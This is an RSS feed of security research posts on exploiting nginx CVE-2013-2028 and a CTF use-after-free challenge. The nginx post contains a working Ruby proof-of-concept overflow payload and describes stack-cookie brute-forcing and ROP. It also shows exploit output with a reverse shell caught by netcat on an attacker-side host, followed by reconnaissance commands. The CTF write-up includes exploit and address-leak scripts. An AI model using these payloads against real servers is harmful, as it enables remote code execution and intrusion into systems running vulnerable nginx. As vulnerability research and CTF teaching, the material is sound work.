<?xml version="1.0" encoding="UTF-8" ?>

<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
   
   	<title>RealJenius.com - Tag: exploit</title>
   
   <link>http://realjenius.com</link>
   <description>I'm a software developer in the game industry, and have been (for better or worse) coding on the Java platform for the last decade. I also do all my own stunts.</description>
   <language>en-us</language>
   <managingEditor>R.J. Lorimer</managingEditor>
   <atom:link href="rss" rel="self" type="application/rss+xml" />
   
	<item>
  <title>Exploiting nginx chunked overflow bug, the undisclosed attack vector (CVE-2013-2028)</title>
  <link>http://realjenius.com/research/2013/07/17/exploiting-nginx-chunked-overflow-bug-the-undisclosed-attack-vector-cve-2013-2028.html</link>
  <author>R.J. Lorimer</author>
  <pubDate>2013-07-17T00:00:00+08:00</pubDate>
  <guid>http://realjenius.com/research/2013/07/17/exploiting-nginx-chunked-overflow-bug-the-undisclosed-attack-vector-cve-2013-2028.html</guid>
  <description><![CDATA[
     <p>In <a href="http://www.vnsecurity.net/2013/05/analysis-of-nginx-cve-2013-2028/">previous post</a>, we analyzed and exploited stack based buffer overflow vulnerability in chunked encoding parsing of nginx-1.3.9 – 1.4.0. We mentioned that there was another attack vector which was more practical, more reliable. I talked about this attack vector at <a href="http://www.secuinside.com">SECUINSIDE</a> 2013 in July (btw, a great conference and CTF). Details can be found in <a href="http://ropshell.com/slides/Nginx_chunked_overflow_the_undisclosed_attack_vector.pdf">slides</a>.</p>

<p>In summary:</p>

<ul>
  <li>Same <a href="http://www.vnsecurity.net/2013/05/analysis-of-nginx-cve-2013-2028/">bug</a> with different code paths that serve dynamic contents via fastcgi, proxy backend, etc. These configurations are more practical in real world environments.</li>
  <li>Heap based overflow instead of stack based overflow as described in the original advisory. Nothing to worry about stack cookie (so no bruteforcing).</li>
  <li>The trick to make heap overflow exploit more reliable is via connection spraying.</li>
  <li>Some small tips and tricks for ROP and shellcode.</li>
</ul>

<p>Enjoy hacking!</p>


  ]]></description>
</item>

	<item>
  <title>[Secuinside CTF 2013] movie talk</title>
  <link>http://realjenius.com/ctf%20-%20clgt%20crew/2013/05/30/secuinside-ctf-2013-movie-talk.html</link>
  <author>R.J. Lorimer</author>
  <pubDate>2013-05-30T00:00:00+08:00</pubDate>
  <guid>http://realjenius.com/ctf%20-%20clgt%20crew/2013/05/30/secuinside-ctf-2013-movie-talk.html</guid>
  <description><![CDATA[
     <p>Challenge itself is very interesting, as we have typical use-after-free problem. It’s running on Ubuntu 13.04 with NX + ASLR.</p>

<p>When we run challenge it gives us message as :</p>

<pre class="brush: plain; title: ; notranslate" title="">######################################
#                                    #
#   Welcome to the movie talk show   #
#                                    #
######################################

1. movie addition
2. movie deletion
3. my movie list
4. quit
:
</pre>

<p>movie addition is very straight forward:</p>

<pre class="brush: plain; title: ; notranslate" title="">.text:080489F4                 mov     dword ptr [esp], 14h ; size
.text:080489FB                 call    _malloc
.text:08048A00                 mov     [ebp+movie_array], eax
.text:08048A03                 cmp     [ebp+movie_array], 0
.text:08048A07                 jnz     short __mem_alloc_ok
</pre>

<p>Alloc struct to hold movie_list which is described like this:</p>

<pre class="brush: plain; title: ; notranslate" title="">00000000 movie_list      struc ; (sizeof=0x14)
00000000 fn_moviedetails dd ?
00000004 movie_name      dd ?
00000008 movie_id        dd ?
0000000C movie_rating    dd ?
00000010 movie_rate      dd ?
</pre>

<p>Than we have small sleep of 2 seconds here:</p>

<pre class="brush: plain; title: ; notranslate" title="">.text:0804880A ; signed int __cdecl get_film_name_rating(movie_list a1)
.text:0804880A get_film_name_rating proc near
.text:0804880A                 push    ebp
.text:0804880B                 mov     ebp, esp
.text:0804880D                 sub     esp, 58h
.text:08048810                 mov     eax, [ebp+movie_array.fn_moviedetails]
.text:08048813                 mov     [ebp+l_movie_array], eax
.text:08048816                 mov     eax, large gs:14h
.text:0804881C                 mov     [ebp+cookie], eax
.text:0804881F                 xor     eax, eax
.text:08048821                 mov     dword ptr [esp], 2 ; seconds
.text:08048828                 call    _sleep   &lt;--- very important here is this sleep remember it for later
</pre>

<p>than movie name is obtained from input:</p>

<pre class="brush: plain; title: ; notranslate" title="">.text:0804882D                 mov     dword ptr [esp], offset aMovieName ; "movie name: "
.text:08048834                 call    _printf
.text:08048839                 mov     eax, ds:stdin
.text:0804883E                 mov     [esp+8], eax    ; stream
.text:08048842                 mov     dword ptr [esp+4], 1Eh ; n
.text:0804884A                 lea     eax, [ebp+nptr]
.text:0804884D                 mov     [esp], eax      ; s
.text:08048850                 call    _fgets
.text:08048855                 lea     eax, [ebp+nptr]
.text:08048858                 mov     [esp], eax      ; s
.text:0804885B                 call    _strlen
.text:08048860                 mov     [ebp+n], eax
.text:08048863                 mov     eax, [ebp+n]
.text:08048866                 add     eax, 1
.text:08048869                 mov     [esp], eax      ; size
.text:0804886C                 call    _malloc          &lt;--- malloc (also very important)
</pre>

<p>Other code is not important, as it reads movie rating, which can be in range from 0-101 (although code says movie rating 1-100), not really important. Also application asks for movie_rate which can be in range:</p>

<pre class="brush: plain; title: ; notranslate" title="">mov     dword ptr [esp], offset aFilmRate012151 ; "film rate [0,12,15,19]: "
</pre>

<p>Than ID of movie is assigned which is it’s current place in array of movies, and not actual ID, and function to display movie is stored also as part of movie_list struct.</p>

<pre class="brush: plain; title: ; notranslate" title="">.text:08048989                 mov     edx, ds:g_count_of_array
.text:0804898F                 mov     eax, [ebp+l_movie_array]
.text:08048992                 mov     [eax+movie_list.movie_id], edx
.text:08048995                 mov     eax, [ebp+l_movie_array]
.text:08048998                 mov     [eax+movie_list.fn_moviedetails], offset PutMovieDetails
.text:0804899E                 mov     eax, 1
</pre>

<p>We noticed first that we can assign random ID to the movie, buy deleting them, and were looking at this code first. For example, when deleting movie this code is used to get it’s index:</p>

<pre class="brush: plain; title: ; notranslate" title="">.text:08048AFB                 call    _fgets
.text:08048B00                 movzx   eax, [ebp+s]
.text:08048B04                 movsx   eax, al
.text:08048B07                 sub     eax, 31h
</pre>

<p>Obviously, if we enter 10 it will always delete movie at index 0, as it considers only one char, thus we were looking where we can confuse program to reuse wrong index. Not good… nothing found. Code seemed like very well written, without errors. Every movie delete would fill gaps in array, thus code really seemed bullet-proof.</p>

<p>When code is about to exit, there was one function called, which would free whole array of movies:</p>

<pre class="brush: plain; title: ; notranslate" title="">.text:08048C3B                 push    ebp
.text:08048C3C                 mov     ebp, esp
.text:08048C3E                 sub     esp, 28h
.text:08048C41                 mov     [ebp+index], 0
.text:08048C48                 jmp     short loc_8048C94
.text:08048C4A __loop_delete:
.text:08048C4A                 mov     eax, [ebp+index]
.text:08048C4D                 mov     eax, ds:g_movie_array.fn_moviedetails[eax*4]
.text:08048C54                 test    eax, eax
.text:08048C56                 jz      short __no_movie
.text:08048C58                 mov     eax, [ebp+index]
.text:08048C5B                 mov     eax, ds:g_movie_array.fn_moviedetails[eax*4]
.text:08048C62                 mov     eax, [eax+movie_list.movie_name]
.text:08048C65                 test    eax, eax
.text:08048C67                 jz      short __no_movie
.text:08048C69                 mov     eax, [ebp+index]
.text:08048C6C                 mov     eax, ds:g_movie_array.fn_moviedetails[eax*4]
.text:08048C73                 mov     eax, [eax+movie_list.movie_name]
.text:08048C76                 mov     [esp], eax      ; ptr
.text:08048C79                 call    _free
.text:08048C7E                 mov     eax, [ebp+index]
.text:08048C81                 mov     eax, ds:g_movie_array.fn_moviedetails[eax*4]
.text:08048C88                 mov     [esp], eax      ; ptr
.text:08048C8B                 call    _free
.text:08048C90
.text:08048C90 __no_movie:
.text:08048C90                 add     [ebp+index], 1
.text:08048C94
.text:08048C94 loc_8048C94:
.text:08048C94                 cmp     [ebp+index], 9
.text:08048C98                 jbe     short __loop_delete
.text:08048C9A                 leave
.text:08048C9B                 ret
</pre>

<p>This function, would give us full control over arrays of movies, as we could free movies, and reuse freed memory to be used later during printing movie:</p>

<pre class="brush: plain; title: ; notranslate" title="">.text:08048BFA                 mov     eax, [ebp+index]
.text:08048BFD                 mov     eax, ds:g_movie_array.fn_moviedetails[eax*4]
.text:08048C04                 test    eax, eax
.text:08048C06                 jz      short loc_8048C23
.text:08048C08                 mov     eax, [ebp+index]
.text:08048C0B                 mov     eax, ds:g_movie_array.fn_moviedetails[eax*4]
.text:08048C12                 mov     eax, [eax+movie_list.fn_moviedetails]
.text:08048C14                 mov     edx, [ebp+index]
.text:08048C17                 mov     edx, ds:g_movie_array.fn_moviedetails[edx*4]
.text:08048C1E                 mov     [esp], edx
.text:08048C21                 call    eax      &lt;-- if we free we could reuse movie.fn_moviedetails
 to execute our code.
</pre>

<p>Than we saw something interesting:</p>

<pre class="brush: plain; title: ; notranslate" title="">.text:08048CA5                 mov     dword ptr [esp+4], offset handler ; handler
.text:08048CAD                 mov     dword ptr [esp], 3 ; sig
.text:08048CB4                 call    _signal         ; SIGQUIT
</pre>

<p>We can invoke free on all lists by sending signal 3 to the process, so we can actually free structs. When we run into it, in a few sec we had working poc:** @__suto** replied on skype : 0×41414141 , and at the same time I replied with 0×61616161 so we knew we have eip control. Now I’ll try to explain how we got to this point. We found also way to leak address of puts from GOT thus we can recalculate system address and call system(“cat key.txt”), as this point we handed POC to <strong>xichzo</strong> which soon got key, and we got 550 <img src="http://vnsec-new.cloudapp.net/wp/wp-includes/images/smilies/icon_smile.gif" alt=":)" class="wp-smiley" /> </p>

<p>Leaking address is something we didn’t manage to do, as application can’t be piped to receive data in real time, eg. pipe is flushed only when process dies, thus even if we leak address it wouldn’t be too much use, as on next run address would be different. So here we go for explanation of our use-after-free exploit:</p>

<p>Break after 1st malloc when adding movie:</p>

<pre class="brush: plain; title: ; notranslate" title="">--------------------------------------------------------------------------[regs]
 EAX: 0x0804C008  EBX: 0xB7FC3000  ECX: 0xB7FC3440  EDX: 0x0804C008  o d I t S z a P c
 ESI: 0x00000000  EDI: 0x00000000  EBP: 0xBFFFF178  ESP: 0xBFFFF150  EIP: 0x08048A00
 CS: 0073  DS: 007B  ES: 007B  FS: 0000  GS: 0033  SS: 007B
--------------------------------------------------------------------------1
=&gt; 0x8048a00:    mov    DWORD PTR [ebp-0x10],eax
 0x8048a03:    cmp    DWORD PTR [ebp-0x10],0x0
 0x8048a07:    jne    0x8048a15
 0x8048a09:    mov    DWORD PTR [esp],0x8048e93
 0x8048a10:    call   0x80486fc
 0x8048a15:    mov    eax,DWORD PTR [ebp-0x10]
 0x8048a18:    mov    DWORD PTR [esp],eax
 0x8048a1b:    call   0x804880a
--------------------------------------------------------------------------------

Breakpoint 1, 0x08048a00 in ?? ()
</pre>

<p>Now comes sleep of 2 seconds, and we allocate 1st movie. This is very important to look at memory layout once 1st movie is added:</p>

<pre class="brush: plain; title: ; notranslate" title="">gdb$ dd 0x804c008
[0x007B:0x0804C008]-------------------------------------------------------[data]
0x0804C008 : AA 87 04 08 20 C0 04 08 - 01 00 00 00 00 00 00 00 .... ...........
0x0804C018 : 00 00 00 00 19 00 00 00 - 61 61 61 61 61 61 61 61 ........aaaaaaaa
0x0804C028 : 61 61 61 61 61 61 0A 00 - 00 00 00 00 D1 0F 02 00 aaaaaa..........
0x0804C038 : 00 00 00 00 00 00 00 00 - 00 00 00 00 00 00 00 00 ................
0x0804C048 : 00 00 00 00 00 00 00 00 - 00 00 00 00 00 00 00 00 ................
0x0804C058 : 00 00 00 00 00 00 00 00 - 00 00 00 00 00 00 00 00 ................
</pre>

<p>So movie_list is:</p>

<pre class="brush: plain; title: ; notranslate" title="">00000000 fn_moviedetails        0x080487AA      &lt;--- display function
00000004 movie_name             0x0804C020      &lt;--- movie name
00000008 movie_id               0x1             &lt;--- index in global array of movies (not important)
0000000C movie_rating           0x0             &lt;--- dummy value which we set to be 0
00000010 movie_rate             0x0             &lt;--- dummy value which we set to be 0
</pre>

<p>Lets observe memory when we allocate 2nd movie_list:</p>

<pre class="brush: plain; title: ; notranslate" title="">EAX = 0x0804C038        &lt;--- right after our movie name string.
</pre>

<p>Now when process goes into sleep(2) at :</p>

<pre class="brush: plain; title: ; notranslate" title="">.text:08048821                 mov     dword ptr [esp], 2 ; seconds
.text:08048828                 call    _sleep
</pre>

<p>We will fire killall -3 movie_talk to free memory occupied by 1st movie_list, and malloc for movie_name will be allocated here. To make it easier for debugging we can cheat by increasing timer to 32 sec:</p>

<pre class="brush: plain; title: ; notranslate" title="">--------------------------------------------------------------------------[regs]
 EAX: 0x00000000  EBX: 0xB7FC3000  ECX: 0xB7FC3440  EDX: 0x0804C038  o d I t s Z a P c
 ESI: 0x00000000  EDI: 0x00000000  EBP: 0xBFFFF148  ESP: 0xBFFFF0F0  EIP: 0x08048828
 CS: 0073  DS: 007B  ES: 007B  FS: 0000  GS: 0033  SS: 007B
--------------------------------------------------------------------------1
=&gt; 0x8048828:    call   0x8048550 &lt;sleep@plt&gt;
 0x804882d:    mov    DWORD PTR [esp],0x8048e86
 0x8048834:    call   0x8048500 &lt;printf@plt&gt;
 0x8048839:    mov    eax,ds:0x804b064
 0x804883e:    mov    DWORD PTR [esp+0x8],eax
 0x8048842:    mov    DWORD PTR [esp+0x4],0x1e
 0x804884a:    lea    eax,[ebp-0x2a]
 0x804884d:    mov    DWORD PTR [esp],eax
--------------------------------------------------------------------------------
0x08048828 in ?? ()
gdb$ break *0x804882d
Breakpoint 15 at 0x804882d
gdb$ set *(unsigned int *)$esp = 0x20
gdb$

...
=&gt; 0xb7fdd424 &lt;__kernel_vsyscall+16&gt;:    pop    ebp
 0xb7fdd425 &lt;__kernel_vsyscall+17&gt;:    pop    edx
 0xb7fdd426 &lt;__kernel_vsyscall+18&gt;:    pop    ecx
 0xb7fdd427 &lt;__kernel_vsyscall+19&gt;:    ret
</pre>

<p>Signal fired, and we can continue:</p>

<pre class="brush: plain; title: ; notranslate" title="">=&gt; 0x804882d:    mov    DWORD PTR [esp],0x8048e86
 0x8048834:    call   0x8048500 &lt;printf@plt&gt;
 </pre>

<p>Now watch for malloc:</p>

<pre class="brush: plain; title: ; notranslate" title="">--------------------------------------------------------------------------[regs]
 EAX: 0x0804C008  EBX: 0xB7FC3000  ECX: 0xB7FC3440  EDX: 0x0804C008  o d I t S z a P c
 ESI: 0x00000000  EDI: 0x00000000  EBP: 0xBFFFF148  ESP: 0xBFFFF0F0  EIP: 0x08048871
 CS: 0073  DS: 007B  ES: 007B  FS: 0000  GS: 0033  SS: 007B
--------------------------------------------------------------------------1
=&gt; 0x8048871:    mov    edx,eax
 0x8048873:    mov    eax,DWORD PTR [ebp-0x3c]
 0x8048876:    mov    DWORD PTR [eax+0x4],edx
 0x8048879:    mov    eax,DWORD PTR [ebp-0x3c]
 0x804887c:    mov    eax,DWORD PTR [eax+0x4]
 0x804887f:    test   eax,eax
 0x8048881:    jne    0x804888f
 0x8048883:    mov    DWORD PTR [esp],0x8048e93
--------------------------------------------------------------------------------

Temporary breakpoint 20, 0x08048871 in ?? ()&lt;/pre&gt;
EAX = 0x804C008 &lt;--- where we had 1st movie list, thus we control movie_list and
function pointer at movie_list.fn_moviedetails
</pre>

<p>Lets look at memory after input is copied there:</p>

<pre class="brush: plain; title: ; notranslate" title="">gdb$ dd 0x804c008
[0x007B:0x0804C008]-------------------------------------------------------[data]
0x0804C008 : 61 61 61 61 61 61 61 61 - 61 61 61 61 61 61 61 61 aaaaaaaaaaaaaaaa
0x0804C018 : 0A 00 00 00 19 00 00 00 - 00 00 00 00 61 61 61 61 ............aaaa
0x0804C028 : 61 61 61 61 61 61 61 61 - 0A 00 00 00 19 00 00 00 aaaaaaaa........
0x0804C038 : 00 00 00 00 08 C0 04 08 - 00 00 00 00 00 00 00 00 ................
0x0804C048 : 00 00 00 00 B9 0F 02 00 - 00 00 00 00 00 00 00 00 ................
</pre>

<p>Woops, 1st movie_lsit is overwriten, now we can list movies and watch how our<br />
data goes to 0x61616161:</p>

<pre class="brush: plain; title: ; notranslate" title="">.text:08048BFA                 mov     eax, [ebp+index]
.text:08048BFD                 mov     eax, ds:g_movie_array.fn_moviedetails[eax*4]
.text:08048C04                 test    eax, eax
.text:08048C06                 jz      short loc_8048C23
.text:08048C08                 mov     eax, [ebp+index]
.text:08048C0B                 mov     eax, ds:g_movie_array.fn_moviedetails[eax*4]
.text:08048C12                 mov     eax, [eax+movie_list.fn_moviedetails]
.text:08048C14                 mov     edx, [ebp+index]
.text:08048C17                 mov     edx, ds:g_movie_array.fn_moviedetails[edx*4]
.text:08048C1E                 mov     [esp], edx
.text:08048C21                 call    eax

--------------------------------------------------------------------------[regs]
 EAX: 0x61616161  EBX: 0xB7FC3000  ECX: 0xB7FDA000  EDX: 0x0804C008  o d I t s z a p c
 ESI: 0x00000000  EDI: 0x00000000  EBP: 0xBFFFF178  ESP: 0xBFFFF150  EIP: 0x08048C21
 CS: 0073  DS: 007B  ES: 007B  FS: 0000  GS: 0033  SS: 007B
--------------------------------------------------------------------------1
=&gt; 0x8048c21:    call   eax
 0x8048c23:    add    DWORD PTR [ebp-0xc],0x1
</pre>

<p>What is also important to notice here, is that movie list is pushed on stack, that means that stack layout is pointing to our controled buffer, so whatever we put into this movie_name, can be used as  argument for our code:</p>

<pre class="brush: plain; title: ; notranslate" title="">gdb$ x/4wx $esp
0xbffff150:    0x0804c008    0x0000000c    0xb7fc3ac0    0xb7e13900
               ^^^^^^^^^^
                   |
                   +---- our controled input

</pre>

<p>Address leak bonus, which was our 1st idea to get system address right away, was to leak puts address and do subtraction, unfortunately due to writing to pipe output would only come when pipe buffer is filled or process is terminated, so our idea didn’t work, but for fun here is our code to leak puts address:</p>

<pre class="brush: plain; title: ; notranslate" title="">gdb$ p puts-system
$1 = 0x26cf0
</pre>

<pre class="brush: plain; title: ; notranslate" title="">import time
import struct
import os
import subprocess

proc = subprocess.Popen("./movie_talk",
                        #shell=True,
                        stdin = subprocess.PIPE,
                        stdout = subprocess.PIP,
                        stderr = subprocess.PIPE);

payload = "1n" + "a" * 16 + "n0n0n"

#leak address of puts on ubuntu 13.04
payload += "1n";
payload += struct.pack("&lt;L", 0x80487aa);
payload += struct.pack("&lt;L", 0x804b030);
payload += struct.pack("&lt;L", 0x804b030);
payload += "n0n0n"
payload += "3n";
proc.stdin.write(payload);
time.sleep(3);
os.system("killall -3 movie_talk");
time.sleep(5);
proc.stdin.write("4n");
proc.wait();
buff = proc.stdout.read();
index = buff.find("movie id: 134524976");
index+=7;
index+=len("movie id: 134524976");
data = struct.unpack("&lt;L", buff[index:index+4]);
for x in data:
    print("puts address   : 0x%.08X" % x);
    print("system address : 0x%.08X" % (x-0x26cf0));
</pre>

<p>and simple exploit to crash process (enable core dump):</p>

<pre class="brush: plain; title: ; notranslate" title="">#!/usr/bin/env python
import  subprocess
import  time
import  os

proc = subprocess.Popen("./movie_talk",
                       shell=False,
                       stdin=subprocess.PIPE);

proc.stdin.write("1n" + "a"*16+"n"+"0n0n");
proc.stdin.write("1n" + "a"*16+"n"+"0n0n"); &lt;-- payload goes here
time.sleep(3);
os.system("killall -3 movie_talk");
proc.stdin.write("3n");
proc.stdin.write("4n");
proc.wait();

</pre>

  ]]></description>
</item>

	<item>
  <title>Analysis of nginx 1.3.9/1.4.0 stack buffer overflow and x64 exploitation (CVE-2013-2028)</title>
  <link>http://realjenius.com/research/2013/05/21/analysis-of-nginx-cve-2013-2028.html</link>
  <author>R.J. Lorimer</author>
  <pubDate>2013-05-21T00:00:00+08:00</pubDate>
  <guid>http://realjenius.com/research/2013/05/21/analysis-of-nginx-cve-2013-2028.html</guid>
  <description><![CDATA[
     <p>A few days after the release of nginx advisory (<a href="http://mailman.nginx.org/pipermail/nginx-announce/2013/000112.html" target="_blank">CVE-2013-2028</a>), we managed to successfully exploit the vulnerability with a full control over the program flow. However, in order to make it more reliable and useful in real world environment, we still explored several program paths and found some other attack vectors. Since the exploit for Nginx 32-bit is available on <a href="https://github.com/rapid7/metasploit-framework/pull/1834" target="_blank">Metasploit</a> now, we decide to publish some of our works here. In this post, you will find a quick analysis for the vulnerability and an exploitation for a 64-bit linux server using the stack based overflow attack vector.</p>

<h3 id="the-bug">The Bug</h3>

<p>Based on <a href="http://nginx.org/download/patch.2013.chunked.txt" target="_blank">the patch</a> on nginx.org, there is a code path that leads to a stack based overflow vulnerability, related to 03 different nginx components:</p>

<p><strong>1) The calculation of “chunked size”</strong> when someone send a http request with the header: “Transfer-Encoding: chunked”. It is calculated at <a href="https://github.com/danghvu/nginx-1.4.0/blob/master/src/http/ngx_http_parse.c#L2011" target="_blank">src/http/ngx_http_parse.c:2011</a></p>

<pre class="brush: cpp; title: ; notranslate" title="">if (ch &gt;= '0' &amp;&amp; ch &lt;= '9') {   ctx-&gt;size = ctx-&gt;size * 16 + (ch - '0');
  break;
}
c = (u_char) (ch | 0x20);
if (c &gt;= 'a' &amp;&amp; c &lt;= 'f') {   ctx-&gt;size = ctx-&gt;size * 16 + (c - 'a' + 10);
  break;
}
</pre>

<p>It simply parses the chunked size input as hex and convert it to base of 10. And since ctx-&gt;size is defined with size_t, an unsigned type, the value of the variable can be misinterpreted as negative number when casting to signed type, as we will see later.</p>

<p><strong>2) Nginx module when serving static file:</strong></p>

<p>When nginx is setup to serve static file (which is the default setting), ngx_http_static_handler in <a href="https://github.com/danghvu/nginx-1.4.0/blob/master/src/http/modules/ngx_http_static_module.c#L49" target="_blank">src/http/modules/ngx_http_static_module.c:49</a> will be executed when receiving a request.</p>

<p>ngx_http_static_handler will then call ngx_http_discard_request_body at <a href="https://github.com/danghvu/nginx-1.4.0/blob/master/src/http/modules/ngx_http_static_module.c#L211" target="_blank">src/http/modules/ngx_http_static_module.c:211</a>.</p>

<p>ngx_http_discard_request_body will then call ngx_http_read_discarded_request_body at <a href="https://github.com/danghvu/nginx-1.4.0/blob/master/src/http/ngx_http_request_body.c#L526" target="_blank">src/http/ngx_http_request_body.c:526</a>.</p>

<p><em>In summary the code path: ngx_http_static_handler-&gt;ngx_http_discard_request_body-&gt;ngx_http_read_discarded_request_body</em></p>

<p>ngx_http_read_discarded_request_body is where it gets interesting, we can see a buffer with fixed size is defined at <a href="https://github.com/danghvu/nginx-1.4.0/blob/master/src/http/ngx_http_request_body.c#L630" target="_blank">src/http/ngx_http_request_body.c:630</a> as follows:</p>

<pre class="brush: cpp; title: ; notranslate" title="">static ngx_int_t
ngx_http_read_discarded_request_body(ngx_http_request_t *r)
{
    size_t     size;
    ssize_t    n;
    ngx_int_t  rc;
    ngx_buf_t  b;
    u_char     buffer[NGX_HTTP_DISCARD_BUFFER_SIZE];
</pre>

<p>NGX_HTTP_DISCARD_BUFFER_SIZE is defined as 4096 in <a href="https://github.com/danghvu/nginx-1.4.0/blob/master/src/http/ngx_http_request.h#L19" target="_blank">src/http/ngx_http_request.h:19 </a></p>

<p>The interesting is at how this buffer is filled at <a href="https://github.com/danghvu/nginx-1.4.0/blob/master/src/http/ngx_http_request_body.c#L649" target="_blank">src/http/ngx_http_request_body.c:649</a> that we shall use later in (3)</p>

<pre class="brush: cpp; title: ; notranslate" title="">size = (size_t) ngx_min(r-&gt;headers_in.content_length_n, NGX_HTTP_DISCARD_BUFFER_SIZE);
n = r-&gt;connection-&gt;recv(r-&gt;connection, buffer, size);
</pre>

<p><strong>3) The state transition when parsing http request</strong></p>

<p>Come back to <a href="https://github.com/danghvu/nginx-1.4.0/blob/master/src/http/ngx_http_request_body.c" target="_blank">src/http/ngx_http_request_body.c</a>, before calling ngx_http_read_discarded_request_body, nginx <a href="https://github.com/danghvu/nginx-1.4.0/blob/master/src/http/ngx_http_request_body.c#L514" target="_blank">check whether we have a “chunked” type of request</a>, it will then run ngx_http_discard_request_body_filter defined in <a href="https://github.com/danghvu/nginx-1.4.0/blob/master/src/http/ngx_http_request_body.c#L680" target="_blank">src/http/ngx_http_request_body.c:680</a>.</p>

<p>ngx_http_discard_request_body_filter will execute <a href="https://github.com/danghvu/nginx-1.4.0/blob/master/src/http/ngx_http_request_body.c#L707" target="_blank">ngx_http_parse_chunked</a> which is the code we mentioned in (1). After that, the return value in “rc” is checked with some constant to decide the next move. One of them is particularly very interesting.</p>

<pre class="brush: cpp; title: ; notranslate" title="">if (rc == NGX_AGAIN) {
     /* set amount of data we want to see next time */
     r-&gt;headers_in.content_length_n = rb-&gt;chunked-&gt;length;
     break;
}
</pre>

<p>**Suppose we can set rb-&gt;chunked-&gt;length as a very large number at (1), and then set rc = NGX_AGAIN at (3), following events will happen:<br />
**</p>

<ul>
  <li>
    <p>r-&gt;headers_in.content_length_n is set to negative ( as it is defined with `off_t` which is <a href="http://www.gnu.org/software/libc/manual/html_mono/libc.html" target="_blank">“a signed integer”</a> type.).</p>
  </li>
  <li>
    <p>The function ngx_http_discard_request_body_filter return and the program move to execute <a href="https://github.com/danghvu/nginx-1.4.0/blob/master/src/http/ngx_http_request_body.c#L526" target="_blank">ngx_http_read_discarded_request_body</a>. which contains our vulnerable buffer.</p>
  </li>
  <li>
    <p>Finally the recv() command is tricked to receive more than 4096 bytes and overflow the buffer on the stack.</p>
  </li>
</ul>

<p>There are many ways to set chunked-&gt;length, since rb-&gt;chunked-&gt;length is assigned at the end of ngx_http_parse_chunked function based on the rb-&gt;chunked-&gt;size that we have a direct control.</p>

<pre class="brush: cpp; title: ; notranslate" title="">switch (state) {
case sw_chunk_start:
	ctx-&gt;length = 3 /* "0" LF LF */;
break;
	case sw_chunk_size:
ctx-&gt;length = 2 /* LF LF */
              + (ctx-&gt;size ? ctx-&gt;size + 4 /* LF "0" LF LF */ : 0);
</pre>

<p>To make rc = NGX_AGAIN, we realize that for a request nginx makes the first recv with 1024 bytes, so if we send more than 1024 bytes ngx_http_parse_chunked will return with a NGX_AGAIN then when nginx tries to recv again it will be right into our setup.</p>

<p>**The payload to overflow the stack buffer is as follows: **</p>

<ul>
  <li>
    <p>Send http request with a “transfer-encoding: chunked”</p>
  </li>
  <li>
    <p>Send a large hexadecimal number to fill the entire 1024 bytes of the first read</p>
  </li>
  <li>
    <p>Send &gt; 4096 bytes to overflow the buffer when it try to recv the second times</p>
  </li>
</ul>

<p><strong>TL;DR ?</strong> Here is the proof of concept for x64</p>

<pre class="brush: ruby; title: ; notranslate" title="">require 'ronin'
tcp_connect(ARGV[0],ARGV[1].to_i) { |s|
    payload = ["GET / HTTP/1.1rn",
            "Host: 1337.vnsecurity.netrn",
            "Accept: */*rn",
            "Transfer-Encoding: chunkedrnrn"].join
    payload &lt;&lt; "f"*(1024-payload.length-8) + "0f0f0f0f" #chunked
    payload &lt;&lt; "A"*(4096+8) #padding
    payload &lt;&lt; "C"*8 #cookie
    s.send(payload, 0)
}
</pre>

<p>strace output at the other end:</p>

<pre class="brush: plain; title: ; notranslate" title="">strace -p 11337 -s 5000 2&gt;&amp;1 | grep recv
recvfrom(3, "GET / HTTP/1.1rnHost: 1337.vnsecurity.netrnAccept: */*rnTransfer-Encoding: chunkedrnrnfff...snip..fff0f0f0f0f", 1024, 0, NULL, NULL) = 1024
recvfrom(3, "AAA..snip..AACCCCCCCC", 18446744069667229461, 0, NULL, NULL) = 4112
</pre>

<h3 id="exploitation-on-x64">Exploitation on x64:</h3>

<p>The problem of stack cookie/carnary can be overcome easily by brute-forcing byte by byte. If we send an extra byte and a worker process crashes, it will return nothing thus we know our cookie value is wrong, we try another value until we receive some output.</p>

<p>Then we need to bypass ASLR and DEP. The exploitation for 32-bit in the metasploit module won’t work, since it will bruteforce the libc address and it’s not feasible given the large address space in x64.</p>

<p>We give an exploit that only relies on the binary i.e. we build the ROP gadget from the binary. mprotect address is computed from mmap64 address (in the GOT-table) then use to allocate a writable-executable memory chunked. Then we use some ROP gadgets to copy our shellcode and have it executed by return to it finally.</p>

<p>TL;DR full exploit code could be find <a href="https://github.com/danghvu/nginx-1.4.0/blob/master/exp-nginx.rb" target="_blank">here</a></p>

<pre class="brush: plain; title: ; notranslate" title="">ruby exp-nginx.rb 1.2.3.4 4321
[+] searching for byte: 1
214
[+] searching for byte: 2
102
[+] searching for byte: 3
232
[+] searching for byte: 4
213
[+] searching for byte: 5
103
[+] searching for byte: 6
151
[+] searching for byte: 7
45
Found cookie: x00xd6x66xe8xd5x67x97x2d 8
PRESS ENTER TO GIVE THE SHIT TO THE HOLE AT w.w.w.w 4000
1120 connections
</pre>

<p><em>At w.w.w.w</em></p>

<pre class="brush: plain; title: ; notranslate" title="">nc -lvvv 4000
Connection from 1.2.3.4 port 4000 [tcp/*] accepted
uname -a
Linux ip-10-80-253-191 3.2.0-40-virtual #64-Ubuntu SMP Mon Mar 25 21:42:18 UTC 2013 x86_64 x86_64 x86_64 GNU/Linux
id
uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),110(netdev),111(admin)
ps aux | grep nginx
ubuntu    2920  0.1  0.0  13920   668 ?        Ss   15:11   0:01 nginx: master process ./sbin/nginx
ubuntu    5037  0.0  0.0  14316  1024 ?        S    15:20   0:00 nginx: worker process
ubuntu    5039  0.0  0.0  14316  1024 ?        S    15:20   0:00 nginx: worker process
ubuntu    5041  0.0  0.0  14316  1024 ?        S    15:20   0:00 nginx: worker process
</pre>

<h3 id="reliable-exploitation">Reliable exploitation</h3>

<p>There are some reasons that the above exploitation/technique may not work in practice:</p>

<p>1) Nginx uses non-blocking recv(). If we can’t send enough data to overwrite the return address/cookie the exploit will fail. This is mostly the case since the normal server will be loaded with requests from different user.</p>

<p>2) Our analysis here is for the default setting of nginx, the code path can be very different with another setting thus making the exploit somewhat useless.</p>

<p>3) A blind attack is difficult without the knowledge of the binary / OS at the remote server. For 32-bit OS, one may further bruteforce the “write” address in the code space in order to leak information but It will still be unreliable due to the unknown sockfd and will fail for PIE.</p>

